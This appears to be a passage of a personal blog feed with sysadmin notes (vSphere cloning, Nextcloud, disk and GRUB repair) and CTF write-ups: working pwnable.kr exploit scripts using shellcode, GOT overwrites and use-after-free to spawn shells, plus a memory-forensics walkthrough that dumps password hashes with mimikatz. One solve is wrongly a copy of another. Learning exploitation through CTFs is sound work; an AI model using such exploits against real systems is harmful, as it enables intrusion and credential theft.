template_name=&#39;ubuntu18.04_x64_server_base&#39;    ResourcePool=&#39;即时克隆&#39;    for new_vm_name in new_vm_name_list:        instant_clone(new_vm_name,template_name,ResourcePool=ResourcePool)if __name__ == &quot;__main__&quot;:    main()</code></pre><p>get_infomation.py</p><pre><code class="python"># encoding=utf-8from common import infoimport atexitimport requests.packages.urllib3 as urllib3import sslfrom pyVmomi import vimfrom pyVim.connect import SmartConnect, Disconnectdef get_obj(content, vimtype, name, folder=None):    obj = None    infomation = []    if not folder:        folder = content.rootFolder    container = content.viewManager.CreateContainerView(folder, vimtype, True)    for item in container.view:        infomation.append(item.name)        if item.name == name:            obj = item            break    return obj, infomation# 开始连接vcentersi = Nonecontext = Noneif hasattr(ssl, &#39;SSLContext&#39;):    context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)    context.verify_mode = ssl.CERT_NONEif context:    si = SmartConnect(host=info.host, port=int(info.port), user=info.user,                      pwd=info.password, sslContext=context)atexit.register(Disconnect, si)print(&quot;Connected to vCenter Server&quot;)content = si.RetrieveContent()# 获取datacenter 信息datacenter, datacenter_infomation = get_obj(content, [vim.Datacenter], info.datacenter_name)print(&quot;datacenter :&quot;, datacenter_infomation)if not datacenter:    raise Exception(&quot;Couldn&#39;t find the Datacenter with the provided name &quot; &quot;&#39;&#123;&#125;&#39;&quot;.format(info.datacenter_name))# 获取cluster信息cluster, cluster_infomation = get_obj(content, [vim.ComputeResource], info.cluster_name, datacenter.hostFolder)print(&#39;cluster_name : &#39;, cluster_infomation)# 获取资源池信息ResourcePool, ResourcePool_infomation = get_obj(content, [vim.ResourcePool], info.template_name)print(&#39;ResourcePool : &#39;, ResourcePool_infomation)# 获取vm信息vm_folder = datacenter.vmFoldervm, vm_infomation = get_obj(content, [vim.VirtualMachine], info.template_name, vm_folder)print(&#39;vm : &#39;, vm_infomation)</code></pre>]]></content>
      
      
      <categories>
          
          <category> virtualization </category>
          
          <category> devops </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vsphere </tag>
            
            <tag> Instant clone </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nextcloud</title>
      <link href="/2019/09/26/nextcloud/"/>
      <url>/2019/09/26/nextcloud/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><pre><code class="bash">sudo yum install -y yum-utils device-mapper-persistent-data lvm2；sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo;yum install epel-release;sudo yum makecache fast;sudo yum update;sudo yum install -y docker-ce;sudo systemctl start docker;docker run -d -p 80:80 -v `pwd`:/var/www/html --restart=always nextclouddocker run --name postgres1 -e POSTGRES_PASSWORD=&#39;password&#39; -p 5432:5432 -d postgresapt-get update -y;apt-get install postgresql redis-server;systemctl start postgresql;systemctl start redis-server;service postgresql restart;service redis-server restart;su - postgresCREATE USER dbuser WITH PASSWORD &#39;dbuser&#39;;CREATE DATABASE dbuser OWNER dbuser;GRANT ALL PRIVILEGES ON DATABASE dbuser TO dbuser;#add redis&#39;memcache.local&#39; =&gt; &#39;\\OC\\Memcache\\Redis&#39;,&#39;redis&#39; =&gt; array(&#39;host&#39; =&gt; &#39;localhost&#39;,&#39;port&#39; =&gt; 6379,),</code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nextcloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>extend hdd in linux with command</title>
      <link href="/2019/09/26/extend-hdd-in-linux-with-command/"/>
      <url>/2019/09/26/extend-hdd-in-linux-with-command/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="command"><a href="#command" class="headerlink" title="command"></a>command</h1><pre><code class="bash">df -lhfdisk /dev/sdaWelcome to fdisk (util-linux 2.31.1).Changes will remain in memory only, until you decide to write them.Be careful before using the write command.GPT PMBR size mismatch (251658239 != 838860799) will be corrected by w(rite).GPT PMBR size mismatch (251658239 != 838860799) will be corrected by w(rite).Command (m for help): dPartition number (1,2, default 2): 2Partition 2 has been deleted.Command (m for help): nPartition number (2-128, default 2): 1Value out of range.Partition number (2-128, default 2): 2First sector (4096-838860766, default 4096):Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (4096-838860766, default 838860766):Created a new partition 2 of type &#39;Linux filesystem&#39; and of size 400 GiB.Partition #2 contains a ext4 signature.Do you want to remove the signature? [Y]es/[N]o: yThe signature will be removed by a write command.Command (m for help): wGPT PMBR size mismatch (251658239 != 838860799) will be corrected by w(rite).The partition table has been altered.Syncing disks.rebootresize2fs -f /dev/sda1df -h</code></pre>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>repair grub</title>
      <link href="/2019/09/20/repair-grub/"/>
      <url>/2019/09/20/repair-grub/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="way-1"><a href="#way-1" class="headerlink" title="way 1"></a>way 1</h1><p>failed~</p><pre><code class="bash">sudo sumount /dev/sda5 /mntmount --bind /dev /mnt/devmount --bind /dev/pts /mnt/dev/ptsmount --bind /proc /mnt/procmount --bind /sys /mnt/syschroot /mntgrub-install --root-directory=/mnt /dev/sda5grub-install --recheck /dev/sda5update-grub</code></pre><h1 id="way-2"><a href="#way-2" class="headerlink" title="way 2"></a>way 2</h1><p>use ISO to boot and try repair<br>add ppa</p><pre><code class="bash">deb http://ppa.launchpad.net/yannubuntu/boot-repair/ubuntu eoan mainsudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys &lt;PUBKEY&gt;</code></pre><pre><code class="bash">apt-get install -y boot-repair &amp;&amp; boot-repair</code></pre>]]></content>
      
      
      <categories>
          
          <category> repair </category>
          
      </categories>
      
      
        <tags>
            
            <tag> grub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac install pwntools</title>
      <link href="/2019/09/20/mac-install-pwntools/"/>
      <url>/2019/09/20/mac-install-pwntools/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><pre><code class="bash">conda create -n py27 python=2.7source activate py27MACOS_UNIVERSAL=no python -m pip install pwntools</code></pre>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable-kr-7</title>
      <link href="/2019/07/21/pwnable-kr-7/"/>
      <url>/2019/07/21/pwnable-kr-7/</url>
      
        <content type="html"><![CDATA[<h1 id="1-loveletter"><a href="#1-loveletter" class="headerlink" title="1.loveletter"></a>1.loveletter</h1><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><span id="more"></span><pre><code class="python">payload = &#39;nv sh -c bash &#39; + &#39;A&#39; * (256 - 14 - 2 - 1) + &#39;|\x01&#39;</code></pre><h1 id="2-crypto1"><a href="#2-crypto1" class="headerlink" title="2.crypto1"></a>2.crypto1</h1><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><pre><code class="python">from pwn import *cookie=&#39;&#39;t=&#39;1234567890abcdefghijklmnopqrstuvwxyz-_&#39;def getmessage(message):    p=remote(&#39;pwnable.kr&#39;,9006)    p.recvuntil(&#39;ID\n&#39;)    p.sendline(str(message))    p.recvuntil(&#39;PW\n&#39;)    p.sendline()    p.recvuntil(&#39;sending encrypted data (&#39;)    data=p.recvuntil(&#39;)&#39;)[:-1]    p.close()    return datadef getcookie(n):    global cookie    s=&#39;-&#39;*(62-n%64)    s1=getmessage(s)    s1=s1[96:128]    for i in t:        s=&#39;-&#39;*(63-len(cookie))+cookie+i        s2=getmessage(s)        s2=s2[96:128]        if s1==s2:            cookie+=i            print(cookie)            breakfor i in range(1,64):    getcookie(i)</code></pre><h1 id="3-bf"><a href="#3-bf" class="headerlink" title="3.bf"></a>3.bf</h1><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><pre><code class="python">#encoding=utf-8from pwn import *s=process(&#39;./bf&#39;)#s=remote(&#39;pwnable.kr&#39;,9001)context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]breakpoints=[ 0x08048648]#gdb.attach(s,gdbscript=&#39;\n&#39;.join([&#39;b *&#39;+str(x) for x in breakpoints])+&#39;c 5\n&#39;)#libc = ELF(&#39;./bf_libc.so&#39;)libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)context.log_level=&#39;debug&#39;s.recvlines(2)p=0x0804A0A0putchar=0x0804a030memset=0x0804a02cfgets=0x0804a010main_addr=0x8048671payload=&#39;&#39;#move putchar+4payload+=&#39;&lt;&#39;*(p-(putchar+4))#leak putcharpayload+=&#39;.&lt;&#39;*4+&#39;.&#39;#overwrite putchar to mainpayload+=&#39;,&gt;&#39;*4#move fgetspayload+=&#39;&lt;&#39;*(putchar+4-fgets)#overwrite fgets to systempayload+=&#39;,&gt;&#39;*4#move memsetpayload+=&#39;&gt;&#39;*(memset-fgets-4)#overwrite memset to fgetspayload+=&#39;,&gt;&#39;*4#run putchar()-&gt; main -&gt;payload+=&#39;.&#39;s.sendline(payload)s.recv(1)putchar_addr=u32(s.recv(4),endianness=&#39;big&#39;)log.info(&#39;putchar_addr:&#39;+hex(putchar_addr))system_addr=putchar_addr-libc.symbols[&#39;putchar&#39;]+libc.symbols[&#39;system&#39;]gets_addr=putchar_addr-libc.symbols[&#39;putchar&#39;]+libc.symbols[&#39;gets&#39;]s.send(p32(main_addr))s.send(p32(system_addr))s.send(p32(gets_addr))s.sendline(&#39;/bin/sh\x00&#39;)s.interactive()raw_input()</code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable-kr-6</title>
      <link href="/2019/04/30/pwnable-kr-6/"/>
      <url>/2019/04/30/pwnable-kr-6/</url>
      
        <content type="html"><![CDATA[<h1 id="1-echo2"><a href="#1-echo2" class="headerlink" title="1.echo2"></a>1.echo2</h1><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><span id="more"></span><pre><code class="python">from pwn import *p = remote(&#39;pwnable.kr&#39;, 9011)shellcode=&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;p.recvuntil(&#39;name? :&#39;)p.sendline(shellcode)p.recvuntil(&quot;&gt;&quot;)p.sendline(&#39;2&#39;)p.sendline(&quot;%9$p&quot;)p.recvline()addr = int(p.recvline(), 16) - 0x20log.info(&#39;addr:&#39;+hex(addr))p.sendline(&#39;4&#39;)p.sendline(&#39;n&#39;)p.sendline(&#39;3&#39;)p.sendline(&#39;A&#39; * 24 + p64(addr))p.interactive()</code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">fun_with_UAF_and_FSB :)</code></pre><h1 id="2-alloca"><a href="#2-alloca" class="headerlink" title="2.alloca"></a>2.alloca</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void callme()&#123;    system(&quot;/bin/sh&quot;);&#125;void clear_newlines()&#123;    int c;    do&#123;        c = getchar();    &#125;while (c != &#39;\n&#39; &amp;&amp; c != EOF);&#125;int g_canary;int check_canary(int canary)&#123;    int result = canary ^ g_canary;    int canary_after = canary;    int canary_before = g_canary;    printf(&quot;canary before using buffer : %d\n&quot;, canary_before);    printf(&quot;canary after using buffer : %d\n\n&quot;, canary_after);    if(result != 0)&#123;        printf(&quot;what the ....??? how did you messed this buffer????\n&quot;);    &#125;    else&#123;        printf(&quot;I told you so. its trivially easy to prevent BOF :)\n&quot;);        printf(&quot;therefore as you can see, it is easy to make secure software\n&quot;);    &#125;    return result;&#125;int size;char* buffer;int main()&#123;    printf(&quot;- BOF(buffer overflow) is very easy to prevent. here is how to.\n\n&quot;);    sleep(1);    printf(&quot;   1. allocate the buffer size only as you need it\n&quot;);    printf(&quot;   2. know your buffer size and limit the input length\n\n&quot;);    printf(&quot;- simple right?. let me show you.\n\n&quot;);    sleep(1);    printf(&quot;- whats the maximum length of your buffer?(byte) : &quot;);    scanf(&quot;%d&quot;, &amp;size);    clear_newlines();    printf(&quot;- give me your random canary number to prove there is no BOF : &quot;);    scanf(&quot;%d&quot;, &amp;g_canary);    clear_newlines();    printf(&quot;- ok lets allocate a buffer of length %d\n\n&quot;, size);    sleep(1);    buffer = alloca( size + 4 );    // 4 is for canary    printf(&quot;- now, lets put canary at the end of the buffer and get your data\n&quot;);    printf(&quot;- don&#39;t worry! fgets() securely limits your input after %d bytes :)\n&quot;, size);    printf(&quot;- if canary is not changed, we can prove there is no BOF :)\n&quot;);    printf(&quot;$ &quot;);    memcpy(buffer+size, &amp;g_canary, 4);  // canary will detect overflow.    fgets(buffer, size, stdin);     // there is no way you can exploit this.    printf(&quot;\n&quot;);    printf(&quot;- now lets check canary to see if there was overflow\n\n&quot;);    check_canary( *((int*)(buffer+size)) );    return 0;&#125;</code></pre><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><p><a href="https://gist.github.com/tsarpaul/d6a10c3f271ce58d20633a872aec96b9">https://gist.github.com/tsarpaul/d6a10c3f271ce58d20633a872aec96b9</a></p><pre><code class="python">from pwn import *# overwrite $ebp-0x4 with ret.# bruteforce the program so ret will contain env, which is sprayed with pointers to shell functionret = &quot;-4759552&quot;spray = p32(0x80485ab)*30000env = &#123;str(a):spray for a in range(12)&#125;while True:  # Took me about 12 tries  p = process(&#39;~/Downloads/alloca&#39;, env=env)  p.sendline(&#39;-68&#39;)  p.sendline(ret)  p.interactive()</code></pre><h1 id="3-rsa-calculator"><a href="#3-rsa-calculator" class="headerlink" title="3.rsa_calculator"></a>3.rsa_calculator</h1><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve 1"></a>solve 1</h2><p>overflow func</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-&#39;&#39;&#39;learn from Gros&#39;&#39;&#39;from pwn import *from binascii import *from gmpy2 import next_prime, iroot,invertBINARY_FILE = &#39;./rsa_calculator&#39;REMOTE = (&#39;pwnable.kr&#39;, 9012)def setup_connection():    binary, libc, preload = None, None, False    local_libc = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;    task_libc = &#39;./libc.so.6&#39;    env = &#123;&#125;    if args.PRELOAD:        local_libc = task_libc        env = &#123;&#39;LD_PRELOAD&#39;: task_libc&#125;    if args.BINARY:        binary = ELF(BINARY_FILE)        context.arch = binary.arch    if args.DBG:        context.log_level=&#39;debug&#39;     if args.REMOTE:        if args.LIBC:            libc = ELF(task_libc)        s = remote(*REMOTE)    else:        if args.LIBC:            libc = ELF(local_libc)                s = process(BINARY_FILE, stderr=open(&#39;/dev/null&#39;, &#39;w+&#39;), env=env)        if args.GDB:            context.log_level=&#39;debug&#39;            context.terminal = [&#39;gnome-terminal&#39;, &#39;-e&#39;]            breakpoints = [0x401408, 0x400e97]  # ret from rsa_encrypt            gdb.attach(s, exe=BINARY_FILE,gdbscript=&#39;\n&#39;.join([&#39;b *&#39;+str(x) for x in breakpoints]))                return s, binary, libcif __name__ == &#39;__main__&#39;:    s, binary, libc = setup_connection()    context.update(arch = &#39;amd64&#39;)    g_pbuf = 0x602560    shellcode_addr = g_pbuf + len(&#39;/bin/sh\x00&#39;)    system_global = 0x602538     addr_plaintext=105    p=4099    q=4111    e=405641    phi=(p-1)*(q-1)    d=invert(e,phi)    d=0xffffffff    # set keys    log.info(&quot;Set keys&quot;)    s.recvuntil(&#39;&gt;&#39;)    s.sendline(&#39;1&#39;)    s.recvuntil(&#39;p :&#39;)    s.sendline(str(p))    s.recvuntil(&#39;q :&#39;)    s.sendline(str(q))    s.recvuntil(&#39;set public key exponent e :&#39;)    s.sendline(str(e))    s.recvuntil(&#39;set private key exponent d :&#39;)    s.sendline(str(d))    s.recvuntil(&#39;&gt;&#39;)    shellcode = &#39;/bin/sh\x00&#39;    shellcode += asm(&#39;&#39;&#39;mov rdi, &#123;g_pbuf&#125;                        xor rsi, rsi                        xor rdx, rdx                        mov rax, [&#123;system_global&#125;]                        call rax                        mov rax, &#123;exit&#125;                        jmp rax                        &#39;&#39;&#39;                    .format(g_pbuf=g_pbuf, system_global=system_global, exit=0x400CBA)                    )    # encrypt    # encrypted payload goes to: 0x6020e0 &lt;g_ebuf&gt;    # shellcode goes to: 0x602560 &lt;g_pbuf&gt;    log.info(&quot;Overwrite func array&quot;)    payload = shellcode    payload = payload.ljust(256 + 1 + 7, &#39;A&#39;)    payload += p32(addr_plaintext)    s.sendline(&#39;2&#39;)    s.recvuntil(&#39;how long is your data?(max=1024) :&#39;)    s.sendline(str(len(payload)))    s.recvuntil(&#39;paste your plain text data&#39;)    s.sendline(payload)    s.recvuntil(&#39;&gt;&#39;)    log.success(&#39;done&#39;)    s.sendline(&#39;1&#39;)    s.interactive()    s.close()</code></pre><h1 id="4-fix"><a href="#4-fix" class="headerlink" title="4.fix"></a>4.fix</h1><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><pre><code class="bash">ulimit -s unlimited./fix1592s</code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable-kr-5</title>
      <link href="/2019/04/22/pwnable-kr-5/"/>
      <url>/2019/04/22/pwnable-kr-5/</url>
      
        <content type="html"><![CDATA[<h1 id="1-dragon"><a href="#1-dragon" class="headerlink" title="1.dragon"></a>1.dragon</h1><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><p>overflow</p><pre><code class="c">while ( *((_BYTE *)ptr + 8) &gt; 0 );</code></pre><span id="more"></span><p>uaf</p><pre><code class="asm">.text:080488C0                 mov     eax, [ebp+dragon.dragon.dragon.dragon.dragon].text:080488C3                 mov     eax, [eax].text:080488C5                 mov     edx, [ebp+dragon.dragon.dragon.dragon.dragon].text:080488C8                 mov     [esp], edx.text:080488CB                 call    eax.text:080488CD                 jmp     short loc_80488DB</code></pre><pre><code class="python">from pwn import *import timeimport sysif len(sys.argv)&lt;2:    p = process(&#39;./dragon&#39;)else:    p = remote(&#39;pwnable.kr&#39;,9004)context.log_level=&#39;debug&#39;# context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]# gdb.attach(proc.pidof(p)[0],gdbscript=&#39;b *0x08048899\nc\n&#39;)def step1(p):    for i in range(0,3):        p.send(&#39;1&#39;+&#39;\n&#39;)def step2(p):    for i in range(0,4):        p.send(&#39;3&#39;+&#39;\n&#39;)        p.send(&#39;3&#39;+&#39;\n&#39;)        p.send(&#39;2&#39;+&#39;\n&#39;)step1(p)p.send(&#39;1&#39;+&#39;\n&#39;)step2(p)p.send(p32(0x08048dbf))p.interactive()</code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">MaMa, Gandhi was right! :)</code></pre><h1 id="2-login"><a href="#2-login" class="headerlink" title="2.login"></a>2.login</h1><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><p>overflow. v4 [ebp-8h] &amp;&amp; a1&#x3D;12</p><pre><code class="c">  int v4; // [esp+20h] [ebp-8h].    memcpy(&amp;v4, &amp;input, a1);  s2 = (char *)calc_md5((int)&amp;v2, 12);</code></pre><pre><code class="python">from pwn import *import timeimport sysif len(sys.argv)&lt;2:    p = process(&#39;./login&#39;)else:    p = remote(&#39;pwnable.kr&#39;,9003)context.log_level=&#39;debug&#39;# context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]# gdb.attach(proc.pidof(p)[0],gdbscript=&#39;b *0x080492E\nc\n&#39;)system_addr=0x8049284ppp=0x11111111input1=0x0811EB3Cp.sendline(b64e(p32(system_addr)+p32(ppp)+p32(input1)))p.interactive()</code></pre><h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">control EBP, control ESP, control EIP, control the world~</code></pre><h1 id="3-otp"><a href="#3-otp" class="headerlink" title="3.otp"></a>3.otp</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char* argv[])&#123;    char fname[128];    unsigned long long otp[2];    if(argc!=2)&#123;        printf(&quot;usage : ./otp [passcode]\n&quot;);        return 0;    &#125;    int fd = open(&quot;/dev/urandom&quot;, O_RDONLY);    if(fd==-1) exit(-1);    if(read(fd, otp, 16)!=16) exit(-1);    close(fd);    sprintf(fname, &quot;/tmp/%llu&quot;, otp[0]);    FILE* fp = fopen(fname, &quot;w&quot;);    if(fp==NULL)&#123; exit(-1); &#125;    fwrite(&amp;otp[1], 8, 1, fp);    fclose(fp);    printf(&quot;OTP generated.\n&quot;);    unsigned long long passcode=0;    FILE* fp2 = fopen(fname, &quot;r&quot;);    if(fp2==NULL)&#123; exit(-1); &#125;    fread(&amp;passcode, 8, 1, fp2);    fclose(fp2);        if(strtoul(argv[1], 0, 16) == passcode)&#123;        printf(&quot;Congratz!\n&quot;);        system(&quot;/bin/cat flag&quot;);    &#125;    else&#123;        printf(&quot;OTP mismatch\n&quot;);    &#125;    unlink(fname);    return 0;&#125;</code></pre><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><p>use subprocess to control singal</p><pre><code class="bash">ulimit -f 0 &amp;&amp; python -c &quot;import os, signal; signal.signal(signal.SIGXFSZ, signal.SIG_IGN); os.system(&#39;./otp 0&#39;)&quot;orulimit -f 0 &amp;&amp; python -c &quot;import subprocess; subprocess.Popen([&#39;./otp&#39;, &#39;&#39;], stderr=subprocess.STDOUT)&quot;</code></pre><h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">Darn... I always forget to check the return value of fclose() :(</code></pre><h1 id="4-ascii-easy"><a href="#4-ascii-easy" class="headerlink" title="4.ascii_easy"></a>4.ascii_easy</h1><h2 id="question-1"><a href="#question-1" class="headerlink" title="question"></a>question</h2><pre><code class="c">#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#define BASE ((void*)0x5555e000)int is_ascii(int c)&#123;    if(c&gt;=0x20 &amp;&amp; c&lt;=0x7f) return 1;    return 0;&#125;void vuln(char* p)&#123;    char buf[20];    strcpy(buf, p);&#125;void main(int argc, char* argv[])&#123;    if(argc!=2)&#123;        printf(&quot;usage: ascii_easy [ascii input]\n&quot;);        return;    &#125;    size_t len_file;    struct stat st;    int fd = open(&quot;/home/ascii_easy/libc-2.15.so&quot;, O_RDONLY);    if( fstat(fd,&amp;st) &lt; 0)&#123;        printf(&quot;open error. tell admin!\n&quot;);        return;    &#125;    len_file = st.st_size;    if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE)&#123;        printf(&quot;mmap error!. tell admin\n&quot;);        return;    &#125;    int i;    for(i=0; i&lt;strlen(argv[1]); i++)&#123;        if( !is_ascii(argv[1][i]) )&#123;            printf(&quot;you have non-ascii byte!\n&quot;);            return;        &#125;    &#125;    printf(&quot;triggering bug...\n&quot;);    vuln(argv[1]);&#125;</code></pre><h2 id="solve-3"><a href="#solve-3" class="headerlink" title="solve"></a>solve</h2><pre><code class="python">from pwn import *import timeimport sysif len(sys.argv)&lt;2:    p = process(&#39;./dragon&#39;)else:    p = remote(&#39;pwnable.kr&#39;,9004)context.log_level=&#39;debug&#39;# context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]# gdb.attach(proc.pidof(p)[0],gdbscript=&#39;b *0x08048899\nc\n&#39;)def step1(p):    for i in range(0,3):        p.send(&#39;1&#39;+&#39;\n&#39;)def step2(p):    for i in range(0,4):        p.send(&#39;3&#39;+&#39;\n&#39;)        p.send(&#39;3&#39;+&#39;\n&#39;)        p.send(&#39;2&#39;+&#39;\n&#39;)step1(p)p.send(&#39;1&#39;+&#39;\n&#39;)step2(p)p.send(p32(0x08048dbf))p.interactive()</code></pre><h2 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">MaMa, Gandhi was right! :)</code></pre><h1 id="5-echo1"><a href="#5-echo1" class="headerlink" title="5.echo1"></a>5.echo1</h1><h2 id="solve-4"><a href="#solve-4" class="headerlink" title="solve"></a>solve</h2><pre><code class="python">from pwn import *p = remote(&#39;pwnable.kr&#39;, 9010)jmp_esp = asm(&quot;jmp rsp&quot;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)shellcode=&quot;\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80&quot;p.recvuntil(&#39;name? :&#39;)p.sendline(jmp_esp)p.recvuntil(&#39;&gt;&#39;)p.sendline(&#39;1&#39;)payload = &#39;A&#39;* 40 + p64(0x6020a0) + shellcodep.recvline()p.sendline(payload)p.recvuntil(&#39;goodbye&#39;)p.interactive()</code></pre><h2 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h2><pre><code class="bash">H4d_som3_fun_w1th_ech0_ov3rfl0w</code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>otterctf_memory_forensics</title>
      <link href="/2018/12/11/otterctf-memory-forensics/"/>
      <url>/2018/12/11/otterctf-memory-forensics/</url>
      
        <content type="html"><![CDATA[<h1 id="1-What-the-password-100"><a href="#1-What-the-password-100" class="headerlink" title="1. What the password? 100"></a>1. What the password? 100</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><p>you got a sample of rick’s PC’s memory. can you get his user password? format: CTF{…}</p><p>Alternative download link: <a href="https://mega.nz/#!sh8wmCIL!b4tpech4wzc3QQ6YgQ2uZnOmctRZ2duQxDqxbkWYipQ">https://mega.nz/#!sh8wmCIL!b4tpech4wzc3QQ6YgQ2uZnOmctRZ2duQxDqxbkWYipQ</a></p><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><p>看到Memory_Forensics，无脑上volatility<br>先在国外服务器起docker-kali，发现没有volatility</p><span id="more"></span><pre><code class="bash">apt-get update&amp;&amp; apt-get install volatility -y</code></pre><p>首先看imageinfo</p><pre><code class="bash">➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 imageinfo                                                Volatility Foundation Volatility Framework 2.6INFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)                     AS Layer2 : FileAddressSpace (/root/Desktop/OtterCTF.vmem)                      PAE type : No PAE                           DTB : 0x187000L                          KDBG : 0xf80002c430a0L          Number of Processors : 2     Image Type (Service Pack) : 1                KPCR for CPU 0 : 0xfffff80002c44d00L                KPCR for CPU 1 : 0xfffff880009ef000L             KUSER_SHARED_DATA : 0xfffff78000000000L           Image date and time : 2018-08-04 19:34:22 UTC+0000     Image local date and time : 2018-08-04 22:34:22 +0300</code></pre><p>由于要密码，很简单，直接dumphash</p><pre><code class="bash">➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 hashdump                                                         Volatility Foundation Volatility Framework 2.6Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Rick:1000:aad3b435b51404eeaad3b435b51404ee:518172d012f97d3a8fcc089615283940:::</code></pre><p>拿<code>518172d012f97d3a8fcc089615283940</code>去解hash发现不对，hash解出来是空密码，flag不对。大佬说是两段hash，后面的没出来，就用python源码的Volatility+mimikatz吧</p><pre><code class="zsh">wget http://downloads.volatilityfoundation.org/releases/2.6/volatility-2.6.zipunzip volatility-2.6.zipwget https://github.com/volatilityfoundation/community/raw/master/FrancescoPicasso/mimikatz.pycp mimikatz.py ./volatility-master/volatility/plugins/➜  volatility-master python vol.py  -f ../OtterCTF.vmem --profile=Win7SP1x64 mimikatz Volatility Foundation Volatility Framework 2.6*** Failed to import volatility.plugins.mimikatz (AttributeError: &#39;module&#39; object has no attribute &#39;ULInt32&#39;)ERROR   : volatility.debug    : You must specify something to do (try -h)</code></pre><p>发现有错误，单独跑下mimakatz</p><pre><code class="zsh">➜  volatility-master python ./plugin/mimikatz.pyc Traceback (most recent call last):  File &quot;/root/Desktop/volatility-master/plugin/mimikatz.py&quot;, line 171, in &lt;module&gt;  File &quot;/root/Desktop/volatility-master/plugin/mimikatz.py&quot;, line 182, in LsaDecryptorAttributeError: &#39;module&#39; object has no attribute &#39;ULInt32&#39;</code></pre><p>mimikatz的锅，找到方法</p><pre><code class="bash">sudo pip uninstall constructsudo pip install 